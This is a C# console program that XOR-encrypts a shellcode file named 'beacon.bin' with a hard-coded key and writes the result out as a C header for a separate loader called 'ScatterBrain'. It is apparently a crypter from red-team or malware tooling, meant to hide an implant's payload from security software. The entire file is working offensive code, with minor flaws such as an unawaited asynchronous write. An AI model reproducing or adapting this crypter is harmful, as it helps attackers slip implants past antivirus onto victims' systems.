namespace Cryptor
{
    using System;
    using System.IO;
    using System.Text;
    using System.Text.RegularExpressions;

    internal class Program
    {
        private static byte[] XorByteArray(byte[] origBytes, char[] cryptor)
        {
            byte[] result = new byte[origBytes.Length];
            int j = 0;
            for (int i = 0; i < origBytes.Length; i++)
            {
                if (j == cryptor.Length - 1)
                {
                    j = 0;
                }

                byte res = (byte)(origBytes[i] ^ Convert.ToByte(cryptor[j]));
                result[i] = res;
                j += 1;
            }

            return result;
        }

        private static void CreateEncryptedBin()
        {
            var filePath = Directory.GetCurrentDirectory();
            string absolutepower = filePath + "\\beacon.bin";
            var fileName = absolutepower;
            byte[] shellcodeBytes = File.ReadAllBytes(fileName);
            char[] cryptor = new char[] { 'S', 'O', 'U', 'R', '\0' };
            byte[] encShellcodeBytes = XorByteArray(shellcodeBytes, cryptor);
#pragma warning disable CS0117 // 'File' does not contain a definition for 'WriteAllBytesAsync'
            string encryptedPath = filePath + "\\encrypted.bin";
            File.WriteAllBytesAsync(encryptedPath, encShellcodeBytes);
#pragma warning restore CS0117 // 'File' does not contain a definition for 'WriteAllBytesAsync'
            Console.WriteLine("Encrypted.bin has been created!");
            Console.WriteLine(" ");
        }

        private static void MagicShit()
        {
            var filePath2 = Directory.GetCurrentDirectory();
            string encryptedPath = filePath2 + "\\encrypted.bin";
            var encfilename = encryptedPath; // File to read in
            byte[] encbytes = System.IO.File.ReadAllBytes(encfilename); // Read file as bytes

            StringBuilder encnewhex = new StringBuilder(encbytes.Length * 2);
            foreach (byte b in encbytes)
            {
                encnewhex.AppendFormat("{0:X2}", b); // place in hex format
            }

            var secretKey = "SOUR";
            char[] cryptor = new char[] { 'S', 'O', 'U', 'R', '\0' };

            var encinitial_Formatting = Regex.Replace(encnewhex.ToString(), ".{2}", "$0,0x"); // Formats majority of string to hex
            var encsecondary_Formatting = string.Format("0x{0}", encinitial_Formatting.PadLeft(2, '0')); // adds 0x to the first character
            var encchunkychunk = Regex.Replace(encsecondary_Formatting.ToString(), ".{55}", "$0,\n"); // Chunk out into 11 bytes per line
            var encsplit_Every_Five = Regex.Replace(encchunkychunk.ToString(), ".{5}", "$0, "); // Every five characters, add in ", "
            var enchouseCleaning = encsplit_Every_Five.ToString().Replace(",,", ","); // Get rid of weird double commas
            var encmaidService = enchouseCleaning.ToString().Replace(", ,", ","); // Get rid of weird comma space at the end of the line
            var encfinalForm = encmaidService.Substring(0, encmaidService.Length - 4); // Get rid of trailing 3 characters that we don't need
            var longDaddy = encfinalForm.Length;

            string superRaw = filePath2 + "\\..\\..\\..\\..\\scatterbrain\\rawdata.h";
            var stream = new FileStream(superRaw, FileMode.Create);
            //var stream = new FileStream(@"C:\\users\\cloud\\desktop\\fuckery\\scatterbrain\\scatterbrain\\rawdata.h", FileMode.Create);
            using (StreamWriter writer = new StreamWriter(stream))
            {
                writer.WriteLine("#pragma once");
                writer.WriteLine("#ifndef RAWDATA_H_");
                writer.WriteLine("#define RAWDATA_H_");
                writer.WriteLine(" ");
                writer.WriteLine("char cryptor[] = \"" + secretKey + "\";");
                writer.WriteLine(" ");
                writer.WriteLine("unsigned char rawData[" + longDaddy + "] = { " + encfinalForm + "};");
                writer.WriteLine(" ");
                writer.WriteLine("#endif");
            }

            Console.WriteLine("Rawdata has been created. You should be ready to compile ScatterBrain!");
            Console.WriteLine(" ");
            using System.IO.StreamWriter encfile = new System.IO.StreamWriter(superRaw, true); // Write content to file.
            //using System.IO.StreamWriter encfile = new System.IO.StreamWriter(@"C:\\users\\cloud\\desktop\\fuckery\\scatterbrain\\cryptor\\bin\\debug\\rawdata.h", true); // Write content to file.
        }

        private static void Main()
        {
            CreateEncryptedBin();
            MagicShit();
        }
    }
}